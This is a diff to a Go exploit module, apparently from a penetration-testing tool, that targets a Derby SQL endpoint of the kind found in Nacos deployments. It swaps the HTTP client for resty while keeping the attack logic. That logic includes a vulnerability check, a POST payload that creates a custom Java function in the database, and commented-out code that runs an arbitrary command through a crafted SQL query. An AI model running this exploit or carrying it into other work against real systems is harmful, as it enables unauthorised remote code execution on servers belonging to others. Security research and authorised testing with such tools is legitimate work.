@@ -4,17 +4,18 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
-	"net/http"
 	"slack-wails/lib/clients"
 	"slack-wails/lib/util"
 	"strings"
+
+	"github.com/go-resty/resty/v2"
 )
 
 type Exp struct {
 	RemovalURL string
 	DerbyURL   string
 	Headers    map[string]string
-	Client     *http.Client
+	Client     *resty.Client
 }
 
 const (
@@ -34,20 +35,20 @@ func New(target string, customHeaders string, proxy clients.Proxy) *Exp {
 		DerbyURL:   target + derbyURI,
 		RemovalURL: target + removalURI,
 		Headers:    header,
-		Client:     clients.NewHttpClientWithProxy(nil, true, proxy),
+		Client:     clients.NewRestyClientWithProxy(nil, true, proxy),
 	}
 }
 
 func (e *Exp) Check() bool {
-	derbyResp, derbyBody, err := clients.NewRequest("GET", e.DerbyURL, e.Headers, nil, 10, false, e.Client)
+	derbyResp, err := clients.DoRequest("GET", e.DerbyURL, e.Headers, nil, 10, e.Client)
 	if err != nil || derbyResp == nil {
 		return false
 	}
-	removalResp, removalBody, err := clients.NewRequest("GET", e.RemovalURL, e.Headers, nil, 10, false, e.Client)
+	removalResp, err := clients.DoRequest("GET", e.RemovalURL, e.Headers, nil, 10, e.Client)
 	if err != nil || removalResp == nil {
 		return false
 	}
-	if strings.Contains(string(derbyBody), "caused: Required") && derbyResp.StatusCode == 500 && strings.Contains(string(removalBody), "caused: Request") && removalResp.StatusCode == 500 {
+	if strings.Contains(string(derbyResp.Body()), "caused: Required") && derbyResp.StatusCode() == 500 && strings.Contains(string(removalResp.Body()), "caused: Request") && removalResp.StatusCode() == 500 {
 		return true
 	}
 	return false
@@ -75,13 +76,13 @@ CREATE FUNCTION S_EXAMPLE_%s(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETE
 		payload, _ := json.Marshal(data)
 
 		// 发送 POST 请求
-		_, body, err := clients.NewRequest("POST", e.RemovalURL, e.Headers, bytes.NewBuffer(payload), 10, true, e.Client)
+		resp, err := clients.DoRequest("POST", e.RemovalURL, e.Headers, bytes.NewBuffer(payload), 10, e.Client)
 		if err != nil {
 			continue
 		}
 
 		var responseData map[string]interface{}
-		if err := json.Unmarshal(body, &responseData); err != nil {
+		if err := json.Unmarshal(resp.Body(), &responseData); err != nil {
 			continue
 		}
 
@@ -102,7 +103,7 @@ CREATE FUNCTION S_EXAMPLE_%s(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETE
 // 		return
 // 	}
 // 	get_sql := fmt.Sprintf("select * from (select count(*) as b, S_EXAMPLE_{%s}('{%s}') as a from config_info) tmp /*ROWS FETCH NEXT*/", id, cmd)
-// 	resp, body, err := clients.NewRequest("GET", e.DerbyURL+"?sql="+get_sql, e.Headers, nil, 10, true, e.Client)
+// 	resp, body, err := clients.DoRequest("GET", e.DerbyURL+"?sql="+get_sql, e.Headers, nil, 10, true, e.Client)
 // 	if resp == nil || err != nil {
 // 		return
 // 	}
@@ -178,7 +179,7 @@ func (e *Exp) getJavaHex(option int) string {
 // 		if len(tempHeader) >= 2 {
 // 			header[tempHeader[0]] = tempHeader[1]
 // 		}
-// 		_, respBody, err := clients.NewRequest("POST", removalURL, header, body, 10, true, client)
+// 		_, respBody, err := clients.DoRequest("POST", removalURL, header, body, 10, true, client)
 // 		if err != nil {
 // 			gologger.Debug(ctx, err)
 // 		}
@@ -187,7 +188,7 @@ func (e *Exp) getJavaHex(option int) string {
 // 			return "不存在该漏洞"
 // 		}
 // 		if strings.Contains(string(respBody), "\"code\":200") {
-// 			_, getBody, err := clients.NewSimpleGetRequest(derbyURL+"?sql="+url.QueryEscape(getSQL), client)
+// 			_, getBody, err := clients.SimpleGet(derbyURL+"?sql="+url.QueryEscape(getSQL), client)
 // 			if err != nil {
 // 				gologger.Debug(ctx, "Failed to read response body: "+err.Error())
 // 			}
